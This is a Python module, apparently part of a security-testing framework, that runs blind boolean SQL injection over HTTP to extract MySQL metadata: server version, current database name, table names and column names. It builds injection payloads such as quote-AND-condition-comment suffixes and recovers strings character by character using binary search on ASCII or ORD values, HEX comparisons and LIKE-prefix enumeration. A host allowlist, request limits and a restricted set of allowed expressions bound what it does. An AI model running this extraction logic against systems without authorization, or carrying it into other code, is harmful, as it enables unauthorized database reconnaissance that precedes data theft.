"""Bounded MySQL metadata discovery over an already verified Web Boolean Oracle.

This executor only sends HTTP requests.  It deliberately has no MySQL client,
socket, credentials, or database connection-string support.
"""

from __future__ import annotations

import hashlib
import json
import re
from datetime import UTC, datetime
from typing import Any

from fastapi import HTTPException

from app.executors.boolean_config_extract import _set_field, _spec
from app.executors.http_executor import execute_http
from app.executors.target_allowlist import target_allowed
from app.models import JobRequest
from app.workspace.paths import workspace_for

_IDENTIFIER = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
_ALLOWED_EXPRESSIONS = {"DATABASE()", "VERSION()", "@@version_comment", "information_schema.tables", "information_schema.columns"}
_EXTRACTION_STRATEGIES = {"ASCII_BINARY_SEARCH", "ORD_BINARY_SEARCH", "HEX_BINARY_SEARCH", "DIRECT_CHARACTER_ENUMERATION", "PREFIX_LIKE_ENUMERATION"}
_DEFAULT_CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-:.@"


def _require_contract(args: dict[str, Any]) -> None:
    if str(args.get("dbms") or "mysql").lower() != "mysql":
        raise HTTPException(422, detail="MYSQL_METADATA_DBMS_REQUIRED")
    required = ("test_field", "baseline_value", "control_fields", "oracle", "target_expression", "expression_type")
    if any(key not in args for key in required) or args.get("expression_type") != "METADATA_DISCOVERY":
        raise HTTPException(422, detail="MYSQL_METADATA_CONTRACT_REQUIRED")
    if not args.get("supporting_evidence_ids") or not args.get("supporting_fact_ids") or not args.get("source_hypothesis_id") or not args.get("approved_analysis_review_id"):
        raise HTTPException(422, detail="MYSQL_METADATA_PROVENANCE_REQUIRED")
    if args.get("assumption_status") not in {"VERIFIED", "HYPOTHESIS"}:
        raise HTTPException(422, detail="MYSQL_METADATA_PROVENANCE_REQUIRED")
    expression = str(args.get("target_expression") or "").strip().rstrip(";").strip()
    if expression.lower() not in {item.lower() for item in _ALLOWED_EXPRESSIONS}:
        raise HTTPException(422, detail="MYSQL_METADATA_EXPRESSION_NOT_ALLOWED")
    profile = args.get("extraction_profile") if isinstance(args.get("extraction_profile"), dict) else {}
    if str(profile.get("extraction_strategy") or "") not in _EXTRACTION_STRATEGIES:
        raise HTTPException(422, detail="EXTRACTION_PROFILE_NOT_AVAILABLE")


def _hash(value: Any) -> str:
    return hashlib.sha256(json.dumps(value, ensure_ascii=False, sort_keys=True, default=str).encode()).hexdigest()


def _metadata_suffix(expression: str, *, candidate_table: str | None = None) -> str:
    normalized = expression.strip().lower().rstrip(";").strip()
    if normalized == "database()":
        return "' AND (DATABASE() IS NOT NULL) -- "
    if normalized == "version()":
        return "' AND (VERSION() IS NOT NULL) -- "
    if normalized == "@@version_comment":
        return "' AND (@@version_comment IS NOT NULL) -- "
    if normalized == "information_schema.tables":
        return "' AND ((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_type='BASE TABLE') >= 0) -- "
    if normalized == "information_schema.columns":
        if not candidate_table:
            raise HTTPException(422, detail="MYSQL_METADATA_CANDIDATE_TABLE_REQUIRED")
        escaped = candidate_table.replace("'", "''")
        return f"' AND ((SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{escaped}') >= 0) -- "
    raise HTTPException(422, detail="MYSQL_METADATA_EXPRESSION_NOT_ALLOWED")


async def mysql_metadata_discovery(request: JobRequest) -> dict[str, Any]:
    args = dict(request.arguments)
    _require_contract(args)
    spec = _spec(args)
    field = str(args.get("test_field") or "")
    if not spec.get("url") or not field:
        raise HTTPException(422, detail="request.url and test_field are required")
    if not target_allowed(spec["url"], request.allowed_hosts):
        raise HTTPException(403, detail="MySQL metadata target is not allowlisted")
    candidate_table = str(args.get("candidate_table") or "") or None
    if candidate_table and not _IDENTIFIER.fullmatch(candidate_table):
        raise HTTPException(422, detail="MYSQL_METADATA_CANDIDATE_TABLE_INVALID")
    root = workspace_for(request.run_id)
    job_id = str(args.get("job_id") or "unknown")
    output = root / "outputs" / "mysql-metadata" / job_id
    evidence = root / "evidence" / "mysql-metadata" / job_id
    output.mkdir(parents=True, exist_ok=True)
    evidence.mkdir(parents=True, exist_ok=True)
    progress_path, checkpoint_path, result_path = output / "progress.jsonl", output / "checkpoint.json", output / "result.json"
    request_contract_path = evidence / "request-contract.json"
    expression = str(args["target_expression"]).strip().rstrip(";").strip()
    stage = str(args.get("stage") or "identify").lower()
    if stage == "columns" and expression.lower() != "information_schema.columns":
        raise HTTPException(422, detail="MYSQL_METADATA_COLUMNS_STAGE_REQUIRES_INFORMATION_SCHEMA_COLUMNS")
    suffix = _metadata_suffix(expression, candidate_table=candidate_table)
    max_requests = min(max(int(args.get("max_requests") or 1), 1), 2000)
    max_tables = min(max(int(args.get("max_tables") or 10), 1), 100)
    max_columns = min(max(int(args.get("max_columns") or 30), 1), 500)
    max_name_length = min(max(int(args.get("max_name_length") or 128), 1), 256)
    discovery_scope = str(args.get("discovery_scope") or "current_database")
    if discovery_scope != "current_database":
        raise HTTPException(422, detail="MYSQL_METADATA_DISCOVERY_SCOPE_UNSUPPORTED")
    contract = {
        "run_id": request.run_id,
        "job_id": job_id,
        "dbms": "mysql",
        "direct_database_connection": False,
        "request": spec,
        "test_field": field,
        "baseline_value": str(args.get("baseline_value") or ""),
        "control_fields": dict(args.get("control_fields") or {}),
        "boolean_oracle": dict(args.get("oracle") or {}),
        "mysql_metadata_expression": expression,
        "candidate_table": candidate_table,
        "discovery_scope": discovery_scope,
        "limits": {"max_tables": max_tables, "max_columns": max_columns, "max_name_length": max_name_length, "max_requests": max_requests},
        "scope": "table_schema=DATABASE() AND table_type='BASE TABLE'" if expression.lower() == "information_schema.tables" else "table_schema=DATABASE() AND table_name=candidate_table" if expression.lower() == "information_schema.columns" else "server_metadata_only",
        "provenance": {key: args.get(key) for key in ("expression_type", "supporting_evidence_ids", "supporting_fact_ids", "source_hypothesis_id", "approved_analysis_review_id", "assumption_status")},
        "extraction_profile": dict(args.get("extraction_profile") or {}),
    }
    request_contract_path.write_text(json.dumps(contract, ensure_ascii=False, indent=2), encoding="utf-8")
    checkpoint = {}
    if bool(args.get("resume")) and checkpoint_path.is_file():
        try:
            checkpoint = json.loads(checkpoint_path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            checkpoint = {}
    request_hash = _hash(spec)
    progress: list[dict[str, Any]] = []
    observations: list[dict[str, Any]] = []
    request_count = int(checkpoint.get("requests") or 0) if checkpoint.get("request_hash") == request_hash else 0

    def save_checkpoint(partial: dict[str, Any]) -> None:
        checkpoint_path.write_text(json.dumps({
            "status": "PARTIAL", "request_hash": request_hash,
            "expression": expression, "candidate_table": candidate_table,
            "requests": request_count, **partial,
        }, ensure_ascii=False, indent=2), encoding="utf-8")

    def oracle_value(result: dict[str, Any]) -> bool | None:
        body = str(result.get("body") or result.get("body_excerpt") or "")
        try:
            parsed = json.loads(body)
        except (TypeError, json.JSONDecodeError):
            return None
        current: Any = parsed
        for part in str((args.get("oracle") or {}).get("json_field") or "matched").split("."):
            if not isinstance(current, dict):
                return None
            current = current.get(part)
        oracle = args.get("oracle") or {}
        if current == oracle.get("true_value", True):
            return True
        if current == oracle.get("false_value", False):
            return False
        return None

    async def probe(condition: str) -> bool:
        nonlocal request_count
        if request_count >= max_requests:
            raise RuntimeError("MAX_REQUESTS_REACHED")
        candidate = _set_field(spec, field, str(args.get("baseline_value") or "") + "' AND (" + condition + ") -- ")
        for key, value in dict(args.get("control_fields") or {}).items():
            candidate = _set_field(candidate, str(key), str(value))
        request_count += 1
        result = await execute_http(request.model_copy(update={"tool": "http_request", "arguments": candidate}))
        value = oracle_value(result)
        observations.append({"condition": condition, "value": value, "status_code": result.get("status_code"), "body_length": result.get("body_length")})
        progress.append({"position": request_count, "stage": stage, "expression": expression, "condition": condition, "value": value, "at": datetime.now(UTC).isoformat()})
        progress_path.write_text("".join(json.dumps(item, ensure_ascii=False) + "\n" for item in progress), encoding="utf-8")
        save_checkpoint({"partial": partial_result})
        if value is None:
            raise RuntimeError("ORACLE_RESPONSE_UNRECOGNIZED")
        return value

    async def extract_number(sql_expression: str, upper: int = 128) -> int:
        low, high = 0, upper
        while low < high:
            middle = (low + high + 1) // 2
            if await probe(f"COALESCE(({sql_expression}),0) >= {middle}"):
                low = middle
            else:
                high = middle - 1
        return low

    profile = dict(args.get("extraction_profile") or {})
    strategy = str(profile.get("extraction_strategy") or "")
    allowed_charset = str(profile.get("allowed_charset") or _DEFAULT_CHARSET)
    length_function = str(profile.get("length_function") or "")
    substring_function = str(profile.get("substring_function") or "SUBSTRING").upper()
    numeric_function = str(profile.get("numeric_function") or "").upper()
    max_profile_length = min(max(int(profile.get("max_length") or max_name_length), 1), max_name_length)
    requests_per_character_limit = min(max(int(profile.get("requests_per_character_limit") or 70), 1), 100)

    def sql_literal(value: str, *, like_pattern: bool = False) -> str:
        escaped = value.replace("\\", "\\\\").replace("'", "''")
        if like_pattern:
            escaped = escaped.replace("%", "\\%").replace("_", "\\_")
        return "'" + escaped + "'"

    def substring_sql(sql_expression: str, position: int) -> str:
        if substring_function in {"SUBSTR", "SUBSTRING", "MID"}:
            return f"{substring_function}(COALESCE(({sql_expression}),''),{position},1)"
        return f"SUBSTRING(COALESCE(({sql_expression}),''),{position},1)"

    async def extract_string(sql_expression: str) -> str:
        length = None
        if length_function:
            low, high = 0, max_profile_length
            while low < high:
                middle = (low + high + 1) // 2
                if await probe(f"{length_function}(COALESCE(({sql_expression}),'')) >= {middle}"):
                    low = middle
                else:
                    high = middle - 1
            length = low
        chars: list[str] = []
        for position in range(1, (length if length is not None else max_profile_length) + 1):
            char_sql = substring_sql(sql_expression, position)
            found = None
            if strategy in {"ORD_BINARY_SEARCH", "ASCII_BINARY_SEARCH"} and numeric_function in {"ORD", "ASCII"}:
                char_low, char_high = 0, 255
                while char_low < char_high:
                    middle = (char_low + char_high + 1) // 2
                    if await probe(f"{numeric_function}({char_sql}) >= {middle}"):
                        char_low = middle
                    else:
                        char_high = middle - 1
                found = chr(char_low) if char_low else None
            elif strategy == "HEX_BINARY_SEARCH" and numeric_function == "CONV":
                char_low, char_high = 0, 255
                while char_low < char_high:
                    middle = (char_low + char_high + 1) // 2
                    if await probe(f"CONV(HEX({char_sql}),16,10) >= {middle}"):
                        char_low = middle
                    else:
                        char_high = middle - 1
                found = chr(char_low) if char_low else None
            elif strategy == "PREFIX_LIKE_ENUMERATION":
                prefix = "".join(chars)
                for candidate in allowed_charset[:requests_per_character_limit]:
                    pattern = sql_literal(prefix + candidate, like_pattern=True)
                    if await probe(f"COALESCE(({sql_expression}),'') LIKE CONCAT({pattern},'%') ESCAPE '\\\\'"):
                        found = candidate
                        break
            else:
                for candidate in allowed_charset[:requests_per_character_limit]:
                    if str(profile.get("comparison_strategy") or "") == "HEX_EQUALITY":
                        hex_candidate = candidate.encode("utf-8").hex().upper()
                        condition = f"HEX({char_sql}) = {sql_literal(hex_candidate)}"
                    else:
                        condition = f"{char_sql} = {sql_literal(candidate)}"
                    if await probe(condition):
                        found = candidate
                        break
            if found is None:
                break
            chars.append(found)
        return "".join(chars)

    partial_result: dict[str, Any] = {}
    try:
        true_probe = await probe("1=1")
        false_probe = await probe("1=2")
        if true_probe == false_probe:
            raise RuntimeError("ORACLE_NOT_DIFFERENTIAL")
        normalized = expression.lower()
        if normalized == "version()":
            partial_result["version"] = await extract_string("VERSION()")
        elif normalized == "@@version_comment":
            partial_result["version_comment"] = await extract_string("@@version_comment")
        elif normalized == "database()":
            partial_result["current_database"] = await extract_string("DATABASE()")
        elif normalized == "information_schema.tables":
            count_expr = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_type='BASE TABLE'"
            count = await extract_number(count_expr, max_tables)
            tables: list[dict[str, Any]] = []
            for index in range(min(count, max_tables)):
                table_expr = f"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() AND table_type='BASE TABLE' ORDER BY table_name LIMIT {index},1"
                name = await extract_string(table_expr)
                if name:
                    tables.append({"name": name, "table_schema": "DATABASE()", "table_type": "BASE TABLE"})
            partial_result["tables"] = tables
            partial_result["user_tables"] = tables
        elif normalized == "information_schema.columns":
            table = candidate_table or ""
            escaped = table.replace("'", "''")
            count_expr = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{escaped}'"
            count = await extract_number(count_expr, max_columns)
            columns: list[dict[str, Any]] = []
            for index in range(min(count, max_columns)):
                column_expr = f"SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{escaped}' ORDER BY ordinal_position LIMIT {index},1"
                name = await extract_string(column_expr)
                if name:
                    columns.append({"name": name, "table_name": table, "table_schema": "DATABASE()"})
            partial_result["columns"] = columns
            partial_result["candidate_columns"] = columns
    except RuntimeError as error:
        if str(error) != "MAX_REQUESTS_REACHED":
            raise HTTPException(422, detail=str(error)) from error
    structured = {
        "database_engine": "mysql",
        "stage": stage,
        "mysql_metadata_expression": expression,
        "candidate_table": candidate_table,
        **partial_result,
        "observations": observations,
        "bounded": True,
        "direct_database_connection": False,
        "allowed_sources": ["DATABASE()", "VERSION()", "@@version_comment", "information_schema.tables", "information_schema.columns"],
        "extraction_profile": profile,
        "extraction_strategy": strategy,
        "scope": contract["scope"],
        "provenance": contract["provenance"],
    }
    required_value = {
        "version": structured.get("version"),
        "version_comment": structured.get("version_comment"),
        "database": structured.get("current_database"),
        "tables": structured.get("tables"),
        "columns": structured.get("columns"),
    }.get(stage)
    if not required_value:
        result_payload = {
            "status": "FAILED",
            "error_code": "MYSQL_METADATA_EMPTY_RESULT",
            "summary": "mysql_metadata_discovery completed without the required metadata fact.",
            "stage": stage,
            "tool_execution_completed": True,
            "retryable": True,
            "structured_result": structured,
        }
        result_path.write_text(json.dumps(result_payload, ensure_ascii=False, indent=2), encoding="utf-8")
        return result_payload
    result_payload = {"status": "COMPLETED", "summary": "Bounded MySQL metadata discovery completed", "structured_result": structured, "artifact_paths": [str(result_path.relative_to(root)).replace("\\", "/"), str(progress_path.relative_to(root)).replace("\\", "/"), str(checkpoint_path.relative_to(root)).replace("\\", "/"), str(request_contract_path.relative_to(root)).replace("\\", "/")], "progress_path": str(progress_path.relative_to(root)).replace("\\", "/"), "checkpoint_path": str(checkpoint_path.relative_to(root)).replace("\\", "/"), "result_path": str(result_path.relative_to(root)).replace("\\", "/")}
    result_path.write_text(json.dumps(result_payload, ensure_ascii=False, indent=2), encoding="utf-8")
    checkpoint_path.write_text(json.dumps({"status": "COMPLETED", "position": request_count, "request_hash": request_hash, "expression": expression, "candidate_table": candidate_table, "requests": request_count}, ensure_ascii=False, indent=2), encoding="utf-8")
    return result_payload
